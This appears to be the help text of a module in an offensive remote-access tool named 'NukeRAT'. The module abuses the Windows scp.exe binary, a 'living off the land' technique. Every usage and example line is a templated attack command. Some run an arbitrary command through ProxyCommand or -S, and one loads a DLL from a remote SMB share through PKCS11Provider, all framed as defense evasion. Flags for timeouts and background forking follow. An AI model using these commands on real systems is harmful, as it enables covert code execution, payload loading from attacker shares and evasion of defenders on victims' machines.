ABOUT
    Used for uploading or downloading files over SSH. LOLBAS
    documents proxy execution of specified command, can be used as a
    defensive evasion and performs indirect execution of a specified
    DLL from a remote share, can be used for defense evasion.

USAGE:
    scp.exe -o ProxyCommand="{CMD}" . localhost:.
    scp.exe -S "{CMD}" . localhost:.
    scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.

EXAMPLES:
    scp.exe -o ProxyCommand="{CMD}" . localhost:.
    scp.exe -S "{CMD}" . localhost:.
    scp -o PKCS11Provider="{PATH_SMB:.dll}" . win@github.com:.

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    scp.exe -o ProxyCommand="{CMD}" . localhost:.
